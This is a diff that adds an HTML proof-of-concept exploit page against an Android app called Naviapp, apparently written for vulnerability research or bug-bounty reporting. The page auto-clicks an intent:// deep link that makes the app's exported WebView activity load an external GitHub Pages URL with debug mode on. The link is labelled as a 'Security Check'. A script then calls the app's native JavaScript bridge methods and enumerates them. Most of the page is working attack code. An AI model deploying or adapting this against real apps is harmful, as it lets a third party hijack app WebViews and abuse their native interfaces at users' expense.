@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Click to Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+    <h2>Test Page</h2>
+    
+    <!-- 1. DEEP LINK THAT TRIGGERS THE APP -->
+    <p><strong>Step 1:</strong> Click this link to launch Naviapp with the exploit:</p>
+    <a href="intent://start#Intent;package=com.naviapp;component=com.naviapp/com.getvisitapp.visit.activity.SdkWebviewActivity;S.web_url=https://1brinda12.github.io/navi/fake_navi.html;B.is_debug=true;end">
+        🔗 Click here to open Naviapp Security Check
+    </a>
+    
+    <script>
+    // 2. AUTO-CLICK FOR EASIER TESTING (Optional)
+    setTimeout(function() {
+        document.querySelector('a').click();
+    }, 1000);
+    </script>
+
+    <hr>
+    
+    <!-- 3. EXPLOIT PAGE THAT RUNS INSIDE THE APP -->
+    <script>
+    // This JavaScript runs AFTER the app opens the WebView
+    // It demonstrates all the Android bridge methods
+    
+    function runExploit() {
+        console.log("Exploit script loaded in Naviapp WebView");
+        
+        // Method 1: Trigger location permission
+        try {
+            Android.getLocationPermissions();
+            console.log("✅ Location permission dialog triggered");
+        } catch(e) { console.log("❌ getLocationPermissions failed: " + e); }
+        
+        // Method 2: Open a link in browser
+        setTimeout(function() {
+            try {
+                Android.openLink("https://example.com");
+                console.log("✅ openLink() called - should open browser");
+            } catch(e) { console.log("❌ openLink failed: " + e); }
+        }, 2000);
+        
+        // Method 3: Try to close the view
+        setTimeout(function() {
+            try {
+                Android.closeView();
+                console.log("✅ closeView() called - activity may close");
+            } catch(e) { console.log("❌ closeView failed: " + e); }
+        }, 4000);
+        
+        // Method 4: List all available methods
+        console.log("=== Available Android methods ===");
+        for (var prop in Android) {
+            if (typeof Android[prop] === 'function') {
+                console.log("• " + prop + "()");
+            }
+        }
+    }
+    
+    // Run when page loads (inside the WebView)
+    window.onload = runExploit;
+    </script>
+    
+    <p><em>Note: After clicking the link, Android will ask "Open in Naviapp?" - click Open.</em></p>
+</body>
+</html>
